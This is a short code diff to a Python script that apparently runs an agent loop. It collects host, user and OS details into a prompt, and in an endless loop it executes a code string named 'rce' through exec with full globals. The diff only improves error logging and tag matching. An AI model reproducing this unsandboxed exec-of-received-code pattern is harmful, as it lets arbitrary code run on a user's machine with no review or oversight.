@@ -1,4 +1,4 @@
-import os, sys, platform, datetime, getpass, time, subprocess
+import os, sys, platform, datetime, getpass, time, subprocess, traceback
 
 def package(p):
     subprocess.check_call([sys.executable, "-m", "pip", "install", p])
@@ -49,7 +49,7 @@ def bld():
     question = f"<python_question_{unique_key}>\n"
     reflect = f"<python_reflect_{unique_key}>\n"
     code = f"<python_{unique_key}>\n"
-    end = "</python>"
+    end = f"</python_{unique_key}>"
     return f"\n{unique_key}\n{now}\n{osy}\n{arch}\n{host}\n{user}\n{py}\n{you}\n"
 
 def aut(cmd):
@@ -94,7 +94,7 @@ def process(cmd):
             exec(rce, globals())
             break
         except Exception as e:
-            log(str(e))
+            log(traceback.format_exc())
 
 if __name__ == "__main__":
     while 1:
